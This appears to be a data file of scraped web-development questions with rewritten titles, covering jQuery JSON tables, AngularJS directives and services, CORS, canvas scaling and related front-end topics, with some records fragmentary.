Jquery: Parsing JSON objects for HTML table," I am trying to display a ""leaderboard"" table based on JSON data.I have read a lot about the JSON format and overcome some initial obstacles, but my Javascript knowledge is very limited and I need help!Basically my JSON data comes through looking like this: What I need is to be able to loop through this array, generating a table row or list item for each object. There will be an unknown amount of total objects in the array but each will have the same format- three values: Name, Score, Team.So far I have used the following code, which confirms that I am successfully loading the objects in the console- but I am not sure how to iterate over them, parsing them into the HTML table.The next step is sorting the entries by score in descending order...Any help would be much appreciated.Thanks!EDIT:Updated code below, this works: (The $.parseJSON was not necessary, we can use 'data' as the JSON array is already parsed I believe) <code>  [{""User_Name"":""John Doe"",""score"":""10"",""team"":""1""},{""User_Name"":""Jane Smith"",""score"":""15"",""team"":""2""},{""User_Name"":""Chuck Berry"",""score"":""12"",""team"":""2""}] $.getJSON(url,function(data){ console.log(data);}); $.getJSON(url,function (data) { var tr; for (var i = 0; i < data.length; i++) { tr = $('<tr/>'); tr.append(""<td>"" + data[i].User_Name + ""</td>""); tr.append(""<td>"" + data[i].score + ""</td>""); tr.append(""<td>"" + data[i].team + ""</td>""); $('table').append(tr); }});",Parsing JSON objects for HTML table

Wrapping text around an aboslute positioned element," I'm stuck on something where I have a loads of content pages with a message box. In this message box, you could have images, text, headers etc. However each message box will have an Icon in the top right of the box. The image will sit in the top of the box fine if i use position:absolute. However If the message box has a header or a paragraph and fills with the width of the box. The text will sit underneath the image.I basically need a wrapper around the image which has a width so the text will only go sit up until the edge of the image. I'm 99% sure i got it working in firebug by wrapping the absolute positioned image in a div and giving it some styles. But I can't seem to get it working today!There are hundreds of pages, so moving the HTML around is not an option. The image doesn't currently have a wrapper. So i'm having to use Jquery to wrap the image.

knowing which Backbone view the event was on," I'm starting out with Backbone.js so I must say I'm not yet very familiar with the concepts.I have predefined HTML and I want to use Backbone to manage this. This is important and I want to keep it like this.Say this is (part of) my HTML: Now the idea is that when you change the input this should update my Backbone Model and render the view, resuling in the h1 being updated with the new name. I'm not sure how I should set up my models and views.I kind of have the structure of my models and my views, but I don't know how I should use them.At the moment I have something like this: So at the places where I added comments in the code I don't know what to do:At the change event, how do I find the model that belongs to this view? I could loop through all the models but that seems inefficient.Again in the render method, how do I get the model that belongs to this view?In the render method, how can I only render the pig view the event was on, and not render all the pigs?Maybe I'm going for a total wrong approach over here. If so, please point me in the right direction. <code>  <div class=""pig"" data-id=""1""> <h1>Harry</h1> <input type=""text"" value=""Harry""></div><div class=""pig"" data-id=""2""> <h1>Jill</h1> <input type=""text"" value=""Jill""></div><div class=""pig"" data-id=""3""> <h1>Bob</h1> <input type=""text"" value=""Bob""></div> var PigModel = Backbone.Model.extend()var pigs = new PigModel()pigs.reset([ {""id"": ""1"", ""name"": ""Harry""}, {""id"": ""2"", ""name"": ""Jill""}, {""id"": ""3"", ""name"": ""Bob""}])var PigView = Backbone.View.extend({ el: '.pig', events: { 'change input': function() { // update appropriate Model ? this.render() } }, render: function() { var new_name = // get new name from model ? var pig_template = _.template($('#pig_template').html()) var new_contents = pig_template({ name: new_name }) // render only the pig that was changed ? }})",Connecting predefined HTML to Models and Views in Backbone
JavaScript - Delaying click event," I'm wondering whether there's a simple way to delay the click event from being processed for a specified period of time. For example we could have So in this case the asynchronous function would be guaranteed some amount of time to run.

I know that it's possible to accomplish something close with But this only works when the link being clicked goes to a full page. I want to be able to deal with links that are used for ajax calls (which don't change the url) as well.I noticed that the mixpanel library has a function track_links which seems to accomplish the delay on the page transition, though that function doesn't seem to work well with the support for ajax links that I mentioned.Any help would be great! Thanks.Edit: So I suppose my question wasn't exactly clear, so I'll try to provide some more details below. I don't care if the async function finishes running! I only want to give it the guarantee that it has some set amount of time to execute, after which I don't care if it finishes, and would prefer to go ahead with the page transition.i.e. I want to delay not the start of the async function, but the start of the page transition. The async function would start running as soon as the click occured.Hopefully this is a bit more clear! <code>  $('#someElement').on('click', 'a', function(event) { var duration = 1000; someAsynchronousFunction(); // Start as soon as click occurs ... // Code to delay page transition from taking place for duration specified}); event.preventDefault();...setTimeout(function(){ window.location = $(this).attr('href');}, duration);",Delaying click event
Issue with stock Browser picking from Gallery," I am working on a web page for uploading photos from a mobile device, using the <input type=""file"" accept=""image/*""/> tag. This works beautifully on iphone and on chrome on the android, but where we are running into issues is with the stock android browser.The issue arises when you select a file from your gallery (it works fine when you use the camera to take a photo). And we have narrowed it down even further to seeing that the data MIME type isn't available when taken from the gallery on the stock browser (the photos below show the first 100 characters of the data URL being loaded. The goal was to force JPEG, but without the MIME type we cannot know for sure how to fix this. See code below for how the images are being rendered.How can an image be rendered without the type? Better yet, does anybody know why the type is not available on the stock android browser?EDITFirstly, these are not the same image, they were taken near the same time, and that's not the issue, that's why the data is different (The MIME type doesn't appear on any images on the stock browser, so that's not the problem.UpdateI confirmed that the MIME type is the issue by inserting image/jpeg into the stock browser where it is on chrome.

Directly output javascript calculations as CSV for download without further server interaction," If we were on a nodeJS server, we could write a header, set a mime type, and send it: and because of the headers, the browser will create a download for the named csv file.When useful data is generated in a browser, one solution to getting it in a CSV file is to use ajax, upload it to the server, (perhaps optionally save it there) and get the server to send it back with these headers to become a csv download back at the browser.However, I would like a 100% browser solution that does not involve ping-pong with the server.So it occurred to me that one could open a new window and try to set the header with a META tag equivalent. But this doesn't work for me in recent Chrome. I do get a new window, and it contains the csvString, but does not act as a download.I guess I expected to get either a download in a bottom tab or a blank new window with a download in a bottom tab.

"Javascript ""use strict"" mode"," A simple Javascript question, For instance I have an Angular app.js like this; I read that using ""use strict"" in beginning of a Javascript file makes all vars in that file to be treated in strict mode, which means will it throw an error when you use a global variable(?), but then how can we access that ""eventApp"" object from all our controllers and services if that's not in global scope?  <code>  'use strict'; var eventsApp = angular.module('eventsApp',[]);",Global variables in JavaScript strict mode
Are they any disadvantages to concat all javascript files (including vendor)," To minimize the number of requests made to my server and improve load time, I was thinking about concatenating all my JS Files, including vendor js files like angular, jquery-ui, ... It's a common practice to do this, but I often see websites that don't include their vendor JS files in the same JS file. I know that lots of sites use CDNs to reuse a cached version of the JS file that an other page might have used. Howewer, sometimes, they are separate vendor JS files that are served on the same server, for example on Github :Github has :Frameworks.js that contains Modernizr, jQuerygithub-...js that contains the JS from Github itself.Is there a particular reason to do this ? Are they any issues that could appear because you concat all your JS Files ? <code> ",Are there any disadvantages to concatenating all JavaScript files (including vendor)
AngularJS: best practice for ensure user is logged in or out using cookieStore," Right now I am building an AngularJS based application on top of Ruby on Rails and using Devise for authentication. I have the server responding properly when a user authenticates successfully and when authentication fails. I guess my question is, using $cookieStore, what's the best practice for knowing if a user is logged in or not? There is a cookie that gets set by Rails called ""myapp_session"", but that session doesn't necessarily mean a user is logged in. Looking for ideas on how to use AngularJS to keep user online/offline management.

Turn off URL redirects in AngularJS," I'm trying to write my first web-app with Angular.In the normal mode (html5Mode off), Angular forces the address's hash part to look like a ""path"" (adding a leading ""/""), and encodes special characters - for example, it allows a single ""?"" and ""#"" in the hash and replaces the others with %3F and %23.Is there a way to turn this feature off? I don't want to use the $locationProvider / $routeProvider features - I want to parse the hash myself (In my case, the user's will enter some ""free text"" in the hash to search inside my website).I read that the routeProvider cannot be configured to use regular expressions...If htmlMode is turned on, then the address's hash part is not forced to look like a path (no leading ""/""), but it still encodes special characters.I'm aware that some browsers might encode/escape the special characters anyway, but if the user managed to enter some special characters in its address bar then I don't want to change it.Thanks <code> ",Turn off URL manipulation in AngularJS

angularjs cascading select/dropdowns," I'm attempting to create a chained/cascading drop-down (select elements) using AngularJS but I'm having difficulty filtering and updating the 'selected' properties with my object properties.When the page first loads, the selected items are filtered and displaying in the drop-downs properly. Once I change the parent drop-down, the child selected item doesn't grab the first item in the filtered list, causing the grandchild drop-down to not update.Any insight would be greatly appreciated and note that I have the parent/child/grandchild arrays separated (and not in sub-arrays) because I will eventually be pulling my data from separate spocs/tables in SQL.

Is it Possible to build Video Chat with Phonegap/Cordova and Websockets/WebRTC like OOVOO/Skype?," Edit: Rephrased My Question and TitleSo if you can tell from the title I am using Phonegap/Cordova and trying to add WebRTC to an HTML/JS/CSS app. Perfectly works on the desktop browser, but not on mobile. The reason I ask this question is because I have seen video chat apps on mobile(oovoo/skype), but no chat apps in the browser. Although I am aware webrtc doesnt work on IOS, but does work on newer versions of Chrome. But is it possible to run WebRTC if I wrap my app in a Cordova/Phonegap webview and distribute it as an app? Because if I can access native components like the camera or accelorometer with PhoneGap why can I not use video chat with an HTML/JS/CSS app?Has anyone tried this?

What do I have to do to get optimal quality when scaling an image in the browser?Note: I want to scale down a large image to a small one, modify color in a canvas and send the result from the canvas to the server.CSS: JS: The image resized with photoshop:The image resized on canvas:Edit: I tried to make downscaling in more than one steps as proposed in:Resizing an image in an HTML5 canvas andHtml5 canvas drawImage: how to apply antialiasingThis is the function I have used: Here is the result if I use a 2 step down sizing: Here is the result if I use a 3 step down sizing: Here is the result if I use a 4 step down sizing: Here is the result if I use a 20 step down sizing: Note: It turns out that from 1 step to 2 steps there is a large improvement in image quality but the more steps you add to the process the more fuzzy the image becomes.Is there a way to solve the problem that the image gets more fuzzy the more steps you add?

Angular access FormController in controller," I have a page with multiple forms and I only want to show one at a time. For this I separated each form into a section and using Bootstrap's accordion plugin I only allow one open section at a time. My markup looks something like this: Everything work just fine, I can navigate between the forms etc.Because I don't want the user opening a section if the one they are currently editing contains validation errors, I tried checking in the open_section function if the form associated with it is valid or not. I tried, but I could not. I could not access the FormController associated with the forms in the controller that is responsible for the page. For some reason, they are not getting published on the scope.This is what I tried:$scope.section1Form is undefinedtried with $scope.$watch('section1Form, function(){}), still undefinedtried adding the name of the form as a second parameter to open_section like so: open_section('section1', section1Form) but in the function the second argument is undefined.Between the <form></form> tags, I have access to the FormController, but outside them I don't. Since the event is coming from outside the <form> (the closing, opening of the sections) I can't pass the FormController to my controller to check the validity of my forms.Is there a way to get around this, or should I refactor my page?I am using Angular 1.1.5 btw.Also, checking with the AngularJS Batarang Chrome plugin, I can see that the forms get published as child scopes to the current scope. EDIT: this is how the scope hierarchy looks for this app Is this because I'm using ng-include? Is there no way to access those forms in a controller then? <code>  <a ng-click=""open_section('section1')"">Section 1</a><div collapse=""section1""> <form name=""section1Form""> </form></div><a ng-click=""open_section('section2')"">Section 2</a><div collapse=""section2""> <form name=""section2Form""> </form></div> - root | ---current controller\'s scope | ----scope that contains the forms",How do I access FormController in parent controller or scope in AngularJS

"Set jsTree Node to ""Undetermined"" State Before Children Load"," I'm using jsTree to show a tree with checkboxes. Each level of nodes is loaded on-demand using the json_data plugin.If a node's descendent is checked, then that node should be in an ""undetermined state"" (like ACME and USA).The problem is, the tree starts out collapsed. ACME looks unchecked but should be undetermined. When I finally expand to a checked node, jsTree realizes the ancestors should be undetermined.So I need to be able to put a checkbox in the undetermined state without loading its children.With jsTree you can pre-check a box by adding the jstree-checked class to the <li>. I tried adding the jstree-undetermined class, but it doesn't work. It just puts them in a checked state.Here's my code: My QuestionHow do I set a node to the undetermined state? <code>  $(""#tree"").jstree({ plugins: [""json_data"", ""checkbox""], json_data: { ajax: { url: '/api/group/node', success: function (groups) { var nodes = []; for (var i=0; i<groups.length; i++) { var group = groups[i]; var cssClass = """"; if(group.isSelected) cssClass = ""jstree-checked""; else if(group.isDecendantSelected) cssClass = ""jstree-undetermined""; nodes.push({ data: group.name, attr: { 'class': cssClass } }); } return nodes; } } }})","Set jsTree Node to ""Undetermined"" State"

It is certainly not about recommending a tool or anything like that. I would just like to know if something is possible to do, and if it is: how.Let's say we have some ordinary HTML page, and want to apply some graphical effect to it, just for a while, then return to the previous form as if nothing has happened.An effect I have in mind is something like that:Are there any jQuery plugins (because it seems there is a jQuery plugin for everything) that can do that? Is it even doable, with HTML5 or CSS3 (I don't care much about legacy browsers support)?The only thing I could come up with was to replace the page with some image, and then apply the transformation to that image, but that doesn't seem like a very good solution, because it would not be possible for the image to look exactly like what a user sees (since the page content is usually dynamic).Okay, so CSS3 has this transform thing, but for what I can see it provides only relatively simple transformations. What about my case of twisting and squeezing? <code> ",Is it possible to apply a twist & squeeze transformation to a whole HTML document?

Angular.js rendering SVG templates in directives," I'm working on a large project with SVG and angular.js, and need solid support for svg directive templates.

Advantages and howto using WebGL instead of 2D canvas context?," Currently, I'm using 2D canvas context to draw an image generated (from pixel to pixel, but refreshed as a whole buffer in once after a generated frame) from JavaScript at about a 25fps rate. The generated image is always one byte (integer / typed array) per pixel and a fixed palette is used to generate RGB final result. Scaling is also needed to adopt to the size of the canvas (ie: going to fullscreen) and/or at user request (zoom in/out buttons).The 2D context of canvas is OK for this purpose, however I'm curious if WebGL can provide better result and/or better performance. Please note: I don't want to put pixels via webGL, I want to put pixels into my buffer (which is basically Uint8Array), and use that buffer (in once) to refresh the context. I don't know too much about WebGL, but using the needed generated image as some kind of texture would work somehow for example? Then I would need to refresh the texture at about 25fps rate, I guess.It would be really fantastic, if WebGL support the colour space conversion somehow. With 2D context, I need to convert 1 byte / pixel buffer into RGBA for the imagedata in JavaScript for every pixel ... Scaling (for 2D context) is done now by altering the height/width style of the canvas, so browsers scales the image then. However I guess it can be slower than what WebGL can do with hw support, and also (I hope) WebGL can give greater flexibility to control the scaling, eg with the 2D context, browsers will do antialiasing even if I don't want to do (eg: integer zooming factor), and maybe that's a reason it can be quite slow sometimes.I've already tried to learn several WebGL tutorials but all of them starts with objects, shapes, 3D cubes, etc, I don't need any - classical - object to render only what 2D context can do as well - in the hope that WebGL can be a faster solution for the very same task! Of course if there is no win here with WebGL at all, I would continue to use 2D context.To be clear: this is some kind of computer hardware emulator done in JavaScript, and its output (what would be seen on a PAL TV connected to it) is rendered via a canvas context. The machine has fixed palette with 256 elements, internally it only needs one byte for a pixel to define its colour. <code> ",Emulating palette based graphics in WebGL v.s. Canvas 2D

Writing custom CSS3 replacements for jQuery.fadeIn and fadeOut," I have written a small amount of code to try and replicate jQuery's .fadeIn() and .fadeOut() functions using CSS transitions to look better on touch devices.Ideally I'd like to avoid using a library so that I can write exactly what I want, and as a learning exercise.fadeOut works well.The idea for fadeIn is to use CSS3 transitions to adjust the opacity of an element, after which the element will be set to display:block; (using is-hidden class) to ensure it's not still clickable or covering something beneath it.fadeIn is not working though. I think it is due to adding the is-animating class at the same time as removing the is-hiding class. The transitionEnd event never fires because a transition does not occur: And the CSS Here's the code: CodePen linkUpdate: I have found what I'd describe as a hack, but that works very well: CSS3 replacement for jQuery.fadeIn and fadeOut Working code after this fix: FixedA solution without setTimeout would be very valuable though. <code>  function fadeIn (elem, fn) { var $elem = $(elem); $elem.addClass('is-animating'); $elem.removeClass('is-hidden'); $elem.removeClass('is-hiding'); $elem.on(transitionEndEvent, function () { $elem.removeClass('is-animating'); if (typeof fn === 'function') { fn(); } });}; .is-animating { @include transition(all 2000ms);}.is-hiding { // Will transition @include opacity(0);}.is-hidden { // Won't transition display: none;}",CSS3 replacement for jQuery.fadeIn and fadeOut

How to prevent deselection of selected text on blur (focus lost)," I have been doing research on this simple sounding issue for a couple of days and I have not seen any result. In a nutshell my problem is as follows: I would like to select text in a some input field, move focus to another field (or generally speaking some other element), but not lose my selected text. Such a situation could correspond to a use-case in which I select text in a field, right-click and display a custom popup menu, but do not wish to lose focus of selected text, because I want to do some operations on the previously selected text.A small code test sample would be (for my initial simple scenario - here I am forcing text selection when the second input field gains focus): I have been searching SO and web for a solution to this and have not seen much if any help.I am not sure this is even really possible (due to the link between blur and selection lost and focus and selection). I have seen a style property called preventDeselect, in another SO answer - this does not work and I have not even such documentation or browser support for this.I am quite struggling with this and would appreciate some help: even saying I can't do this at all or maybe some ways to go.UPDATE:Just for the record, my user scenario, which refers to text selection and context menu, is a common one (it slipped my mind to mention): just select some text in this page (or in an input type field) and right click to get the browser's default context menu - my scenario is different in that i want to use a custom menu, but with similar behavior to the browser's context menu - which normally allows to select some text, cut/copy the selection, navigate within the context menu without losing the selected text. So I think it should be possible somehow :) to do all these things with a context menu and still have your selection. <code>  <html><head> <script src=""http://code.jquery.com/jquery-latest.js""></script></head><body> <input type=""text"" id=""text1"" size=""20"" value=""Test1""/> <input type=""text"" id=""text2"" size=""20"" value=""Test2""/> <script> $('#text2').focus( function (evt) { var target = $('#text1')[0]; target.select(); console.log('active/focused element: ' + document.activeElement.id); }); </script></body></html>",How to prevent deselection of selected text on blur (focus lost) in html

jquery namespace declaration and modular approach," I have confusion on how to proceed with my project.I am developing an enterprise app in which lots of modules are to be written.Most of module will be using lots of jQuery plugins to create complex grids, draw graphs for different purposes which means modules will be appending divs, tables etc a lot to DOM.I want to preserver namespace since this will be large app.For that I came across prototype method and self-executing anonymous function.self-executing anonymous function seems to be recommended a lot.My questions are Are self executing functions reusable ?I mean these are immediately executed so lets say a module draws a complex grid for a given JSON file. So will I be able to use same self-executing anonymous function for 3 different JSON files just like a jQuery plugin ?when there will be lots of modules written , they will all self execute on start-up. Will it effect Ram/Processor usage? Shouldn't it be way that modules should be called when needed ? what significance will self execution do ? My Project Scope:Kindly help me understand this self executing thing in my project scope, which is My project Holds a main namespace say ""Myapp"" and and its modules like Myapp.moduleA, Myapp.moduleB.MyApp will trigger its modules on click etc.What is best way to go for me ?Self-Executing Anonymous Func  <code>  (function( skillet, $, undefined ) { //Private Property var isHot = true; //Public Property skillet.somevar = ""Bacon Strips""; //Public Method skillet.draw = function() { //Draw a grid }; //Private Method function _grid( ) { // } } }( window.skillet = window.skillet || {}, jQuery ));",jQuery namespace declaration and modular approach

AngularJS directive / When directive's name really matters," I've just come across a strange behavior from Angular:Here's the scenario:In a registration form, I want to check for email uniqueness (through an http call to server).Thus, I created a directive called emailUnique whose client code is: For the rest of the post, let's suppose that user is typing: michael, that is clearly not a valid mail.Let's take a look at the interesting portion of my directive code, triggering the behavior I'm interested to: Before giving the answer, at first glance, the response would logically be: Why? Because:We precise the type=""email"" attribute and not simply type=""text""michael isn't a valid mail.Angular's compiler is supposed to conform to classic HTML behavior.After testing it, the answer is undefined as expected. My complete directive's logic will be based on that and the whole works fine.Now, let's rename the directive: emailUnique becoming somethingUnique.Client being now: Surprise: the console.log(viewValue) is now displaying: michael, not undefined ...Clearly, starting with email for the name has a strange effect when dealing with an email field in this case. My question is simple: Is there a good reason? A possible bug? Might I misunderstand some notion?Some further precisions: The Angular's documentation about Email field with angular does not present some email attribute that could interfere with email-unique. Indeed, it's based on the type=""email""I came across the same issue whether the form's novalidate attribute is present or not. <code>  <form name=""form"" novalidate><!-- some other fields --><input name=""email"" type=""email"" ng-model=""user.email"" required email-unique/></form> angular.module('directives.emailUnique', []) .directive('emailUnique', function () { return { restrict: 'A', require: 'ngModel', link: function (scope, el, attrs, ctrl) { ctrl.$parsers.push(function (viewValue) { console.log(viewValue); //What do you expect here for viewValue? answer below }); } }; }); undefined <input name=""email"" type=""email"" ng-model=""user.email"" required something-unique/>",When Angular directive's name really matters

d3JS: Zoom to change density of values," I'm creating a chart similar to Mike Bostock's zoomable area chart.For my specific project, I have a bunch of sensors which are recording values every 30 seconds (temperature, light, humidity and sound). I have the zoom implementation working, however when I zoom out to the scale of, say, a year, the density of the chart slows downs the browser and the graphics don't read as well.How can I edit the script so that the density of the line graph changes relative to the amount of zoom? In other words, the x domain is controlling the number of points on the valueline. I'd like to have full density (a recording every 30 seconds) when I zoom in to a time range of one hour, and I'd like much lower density (a recording every day) when I zoom out. Any ideas?

AngularJS: Prevent swipe from triggering ng-click handler," I'm working on implementing an iOS-like swipe-to-delete gesture on HTML table rows. For example, a leftwards swipe on Site11 will turn it from a standard row:into a delete-able row:I have this functionality working with the ng-swipe-left directive. However, I also have a ng-click directive on each row that navigates to a different view of the application. Currently, both events are triggered when I perform a swipe on a row, except when the swipe ends on the ""Site11"" text itself, as opposed to anywhere else within the row. For example, this gesture will trigger both the ng-click and the ng-swipe-left handlers:but this gesture will only trigger the ng-swipe-left handler:How can I prevent the ng-click handler from being fired if a swipe is performed on the row, regardless of where the swipe ends?Here's the gist of my HTML structure that defines each row: The delete button is defined inside the list-item directive; it is only visible if its ID matches the swipeDeleteItemId property on the controller: I should mention that I've only tried this in the desktop versions of Chrome and IE11 - I'm assuming a click and drag from a mouse registers identically to a swipe on a mobile device. <code>  <tr ng-repeat=""item in items""> <td ng-click=""openDetailPane()"" ng-swipe-left=""$parent.swipeDeleteItemId = item.Id"" ng-swipe-right=""$parent.swipeDeleteItemId = 'none'""> <div list-item></div> </td> <td> <i class=""fa fa-angle-right fa-2x"" /> <span>{{item.ChildCount}}</span> </td></tr> <div class=""list-item""> <span>{{item.Name}}</span> <div ng-class=""{true: 'is-visible', false: ''}[item.Id === swipeDeleteItemId]""> <div class=""delete-item-swipe-button"" ng-mousedown=""$event.stopPropagation();"" ng-click=""$event.stopPropagation();"">Delete</div> </div></div>",Prevent swipe from triggering ng-click handler

Understanding AJAX CORS and security considirations," I am trying to understand why CORS is working in way that it works. As I learned from this post, when page from www.a.com makes AJAX request to www.b.com, then it's the www.b.com that decides if request should be allowed or not. But what is exactly secured on client in such model?For example, if a hacker succeeds to make an XSS script injection to my page, then it makes an AJAX request to his domain to store user data. So a hacker's domain will allow such a request for sure. I thought that www.a.com should decide to which domains to allow the request to. So in theory within a header Access-Control-Allow-Origin I would like to put the whole list of the domains that are allowed for AJAX CORS requests.Can someone explain what security problems the current CORS implementation handles? <code> ",Understanding AJAX CORS and security considerations

How to use meteor methods inside of a template helper," How can I define a Meteor method which is also callable in a template helper?I have these two files:file: lib/test.js file: client/myView.js When I give ""str"" a normal string everything works fine. But in this case my template does not get any value. I defined - for the test - in the same file where the method is a normal function and tried to call the function. The error I got was that the function does not exist. So I think that Meteor tries to render the template before it knows anything about the methods I defined for it. But I think that this is a bit unusual - isn't it? <code>  Meteor.methods({ viewTest : function (str) { return str; }}); Template.helloWorld.helpers({ txt : function () { var str = Meteor.call('viewTest', 'Hello World.'); return str; }});",How to use Meteor methods inside of a template helper

How does browsers detect a js script is not responding, Sometimes in web development the browser warns that some js script is not responding. We generally call that a freeze effect. I generally work around it by being less aggressive in term of data size or client-side processing. But I don't really know how the most popular browsers detect this. Is it based on memory consumption or kind of timeout? Is there any tool to measure that? <code> ,How do browsers detect a JS script is not responding?

Angular services not acting as singletons," I come from a static typed object oriented background (C#) and am new to Angular and Javascript in general. I am trying to build an app using Angular and JQueryMobile and am facing a situation where the services are not behaving like singletons - i.e. even though they have been initialised once in one controller, the properties within the service are not storing any state that they were set to when passed into another controller or service. Also, I am experiencing some unexpected behaviour when I try to debug the code which is described below:My setup:I am using the JQueryMobile single page template having all the pages of the app as divs on the same html page and the redirection takes place using ""href=""#DivName"" patternEvery div(page) of the app has an associated controller and serviceThe controllers get injected with multiple services as per requirement and the injected services are expected to retain the state that they were initialised to in other controllers.I am not using routing and templates - the whole html is in a single pageThe relevant code outline is below:HTML: SERVICES: CONTROLLERS: QUESTIONS: In the above code for serviceA, if I initialise the value for propA by hard coding it before the return block, the value does get returned when getPropA() method is executed. Please explain how this works.I would also like to know the order of invoking the the javascript code in Angular - my understanding is that angular runtime invokes the appropriate controller's function when the relevant page is loaded in the browser and the controller code in turn invokes the service methods. But if I have alerts in different controllers and/or services and load the page, the alerts get displayed right away even though the page or controller/service was not supposed to be invoked. What is even more odd is that the alerts do not get executed when the actual controller or service method in which they were placed does get executed. It seems like all the controllers are getting executed on page load.Please let me know how to setup my code so that I can pass the services in different controllers without them losing their state once initialised or updated anywhere during the execution.Thanks,ShantanuEDIT:The answer I think lies right there in my second question. For me - the control flow for the execution of the code is not clear. Below is what I think the problem is:Basically, both the angular controllers are getting executed on page load by the angular runtime rather than in the sequence that they are loaded and used in the app - though this might just be a JQMobile thing.When an assignment operation takes place on a user interface action, the corresponding variable in the service is set successfully. But the angular runtime does not re-evaluate all the controllers to ensure that the new assignment is reflected across all the controllers.So the other controller continues to return what it was set to at initialization - undefined.But if the variable is set at page load itself - that is the value returned as the initialization takes place with the required value and everything works.As requested I have also created below a simple plunk to show the above points with comments:http://plnkr.co/edit/yBOL0P3ycsoNzVrydaMsAs a solution to the problem, below is what I think should work:Somehow ensure that the controllers are initialized only when required rather than all at once on page load so that the initialization can take place as per the state set in the previous actions. I think can be achieved through templates and routing so that the controllers are invoked only when the required route and template is called foe. I'm not sure if this is the way it works.The second option is to publish events in setting controllers and subscribe to them wherever required to keep things in sync. This seems like a better approach.I will confirm this and post an answer if it works.Please let me know your thoughts.Sorry for the long post :) <code>  <div data-role=""page"" id=""PageA"" data-ng-controller=""PageAController""> <!-- page content and UI elements--> </div><div data-role=""page"" id=""PageB"" data-ng-controller=""PageBController""><!-- page content and UI elements--> </div> var App = angular.module('App', []);App.service('serviceA', function () { var propA; //objectX is an array of objects with each object containing a hashtable and some other properties propA = [{},{}]; //hardcoded value for objectX gets returned properly return { initialize: function(objectX){ propA = objectX; // Dynamically initialized objectX value is returned as ""undefined"" by the getPropA function below }, getPropA: function () { return propA; } };});App.service('serviceB', function (serviceA) { var propB; return { initialize: function(){ propB = serviceA.getPropA(); //THIS DOES NOT WORK AS THE VALUE RETURNED IS UNDEFINED }, processPropB: function () { //logic for processing of propB } };}); App.controller('ControllerA', ['$scope', 'ServiceA',function ($scope, ServiceA) { $scope.UITriggeredAction = function(){ ServiceA.initialize(objectX); }; }]);//This controller gets invoked at a later point during the user interaction where ServiceA is supposed to be initialised and injectedApp.controller('ControllerB', ['$scope', 'ServiceB', 'ServiceA',function ($scope, ServiceB, ServiceA,) { var returnedPropA = ServiceA.getPropA(); //THIS RETURNS UNDEFINED TOO //process logic to use serviceB depending on valu of returnedPropA}]);",Proper way to initialize angular services using the controllers

AngularJS make use of the styleguide," I'm trying to use some of angulars best practices defined on the google-styleguide site: https://google-styleguide.googlecode.com/svn/trunk/angularjs-google-style.htmlBut at the moment I'm struggling with some issues. Before I used this styleguide I had the $scope variable available to do a $watch on a variable for instance. Now with my new approach I don't know how to handle this? Should I still inject $scope? Because I do not have to inject $scope when I'm not using $watch. The styleguide also advices to make use of prototypes. But what if I had to inject a service? What is the best approach to use a service inside your prototype? Is this correct? Or am I missing something, is there a place where I can find more information about this style of angular programming? In my opinion it feels more like natural javascript and I want to use this way of organizing my AngularJS apps.Thanks in advanceUpdateFor the 'service' problem I was thinking of something as follows: But this doesn't feel right imo.. <code>  app.controller('myController',['$scope', function($scope) { $scope.$watch('myVariable', function(val) { alert(""I'm changed""); });}]); function myController($scope) { var vm = this; vm.myVariable = ""aVariable""; vm.$watch('vm.myVariable', function(val) { // error because $watch is undefined }); //$scope.$watch - works}app.controller('myController',['$scope', myController]); function myController(MyService) { var vm = this; vm.myService = MyService;}myController.prototype.callService = function() { var vm = this; vm.myService.doSomething();} function MyBaseController(AService, BService, CService) { this.aService = AService; this.bService = BService; this.cService = CService;}function myController() { var vm = this; MyBaseController.apply(vm, arguments);}myController.prototype.doSomething() { var vm = this; this.aService.somethingElse();}",AngularJS best practices - Styleguide

"Coming from Rails, is there a similar Django way to write unobtrusive JavaScript and/or make AJAX form submissions?"," I'm a Ruby/Rails developer now working at a Python/Django shop. I've started to warm up to Python, however, I'm still struggling to find Django comparable to Rails in certain aspects I find important. A lot of my current and future work will focus on making AJAX requests to our API. As a Rails developer, I'd have used unobtrusive javascript and in particular on form submissions added a data-remote tag, as shown below.I'd then write a method in the controller to handle the request and would have written a JavaScript/jQuery function using event delegation in a JS file located in the /assets/js directory to handle the response on the client-side. I assumed coming over to Django there would be a similar way of implementing this sort of functionality.What I guess I'm really trying to say is I assumed Django would offer similar ""magic"" to Rails in terms of not having to write out jQuery AJAX functions every time I wanted to make an AJAX request. I wrote a rough comparison (very rough) of how I'd write both of these out. I'm looking to learn if this is an incorrect approach to what I would do in Rails in Django. I know StackOverflow isn't meant for opinions, but I think breaking principles that apply no matter what language/framework you're using, i.e. DRYing up code by not writing out AJAX functions over and over, isn't really going against an opinion, its more like breaking an accepted rule.My current approach to working with AJAX requests in Django feels wrong, or maybe I'm just used to the ""magic"" Rails offers via the data-remote=""true"" attribute. Would love some guidance on the topic to help me determine a solid approach, thanks.

find screen dimensions regardless of resolution using javascript," I was reading many questions on SO regarding best ways to detect screen size in pixels which is ultimately dependant on resolution to find the actual screen size.I know some mobile devices have small screen (say 4inch) yet the resolution is high.

As mentioned in a comment or two below, personal issues have prevented me from being able to find the time to investigate. <code>  <body ng-controller=""MainCtrl""> <form name=""validationForm"" novalidate> <valid-form-group class=""form-group"" ng-class=""{'has-error': validationForm.validInfo.$error.required}"" required> <select ng-model=""data.option"" ng-options=""option.id as option.message for option in selectOptions"" name=""validInfo"" id=""validInfo""> <option value="""">-- Select a Question --</option> </select> </valid-form-group> </form></body> var app = angular.module('plunker', []) .controller('MainCtrl', function($scope) { $scope.selectOptions = [ {id: 1, message: 'First option'}, {id: 2, message: 'Second option'}, {id: 3, message: 'Third option'} ]; }) .directive('validFormGroup', function($compile) { return { restrict: 'E', template: '<div><span ng-transclude></span></div>', replace: true, transclude: true, require: '^form', link: function(scope, element, attrs, ctrl) { if (attrs.required !== undefined) { var selectElement = angular.element(element.find('select')); // either of the below produce the same results selectElement.attr('ng-required', true); //selectElement.attr('required', true); // if the below is commented out it wont validate // BUT if it is left in it will recompile and add another 3 options $compile(selectElement)(scope); } } }; }); .has-error{ border: solid 1px red;}",Compiling dynamic content - AngularJS

